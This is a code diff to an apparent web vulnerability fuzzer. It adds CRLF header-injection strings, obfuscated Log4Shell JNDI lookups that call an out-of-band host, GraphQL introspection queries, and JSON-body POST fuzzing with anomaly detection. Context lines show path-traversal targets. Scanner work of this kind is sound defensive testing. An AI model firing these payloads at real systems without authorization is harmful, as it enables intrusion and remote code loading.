@@ -89,7 +89,23 @@ const FUZZ_GRAMMARS: Record<string, string[]> = {
     "/proc/self/environ",
     "C:\\windows\\win.ini",
   ],
+  header_injection: [
+    "test\r\nX-Injected: 1",
+    "test%0d%0aX-Injected:%201",
+    "test\nLocation: https://evil.test",
+    "test%0aSet-Cookie:%20pwn=1",
+  ],
+  log4shell: [
+    "${jndi:ldap://oob.cyberscope.test/x}",
+    "${${lower:j}ndi:${lower:l}dap://oob.cyberscope.test/x}",
+    "${${::-j}${::-n}${::-d}${::-i}:ldap://oob.cyberscope.test/x}",
+  ],
+  graphql_introspection: [
+    "{__schema{types{name,fields{name}}}}",
+    "query{__type(name:\"User\"){fields{name,type{name}}}}",
+  ],
 };
+
 
 // Genetic mutation operators
 function mutate(seed: string): string[] {
@@ -202,8 +218,39 @@ async function fuzzEndpoint(
       });
     }
   }
+
+  // ── Advanced: JSON-body POST fuzzing (catches APIs that ignore query strings) ──
+  for (const payload of payloads.slice(0, 4)) {
+    if (timeLeft() < 4000) break;
+    try {
+      const body = JSON.stringify({ q: payload, input: payload, search: payload, id: payload });
+      const t0 = Date.now();
+      const r = await safeFetch(url, {
+        method: "POST",
+        headers: { "Content-Type": "application/json", "User-Agent": "CyberScope-ProFuzz/1.0" },
+        body,
+      }, 5000);
+      const ms = Date.now() - t0;
+      const text = await r.text().catch(() => "");
+      const delta = baselineLen > 0 ? Math.abs(text.length - baselineLen) / baselineLen : 0;
+      const timeBased = /sleep|pg_sleep|WAITFOR|timeout 3/i.test(payload);
+      const errLeak = /SQL syntax|ORA-\d|MySQL|PostgreSQL|stack trace|Traceback/i.test(text);
+      const anomaly = (timeBased && ms > baselineMs + 2500) || r.status >= 500 || delta > 0.3 || errLeak;
+      if (anomaly || r.status !== 404) {
+        results.push({
+          url, vulnClass, payload: `[JSON-BODY] ${payload}`, strategy: `${strategy}+json-body`,
+          baselineStatus, probeStatus: r.status,
+          bodyDeltaPct: Number((delta * 100).toFixed(2)),
+          responseTimeMs: ms, anomaly,
+          signal: anomaly ? (errLeak ? "high" : "medium") : "none",
+          notes: anomaly ? "json-body anomaly" : "json-body baseline",
+        });
+      }
+    } catch { /* skip */ }
+  }
   return results;
 }
+
 
 // Test CVE templates from intel_feeds against target endpoints — emits per-template scan_logs
 async function testCveTemplates(
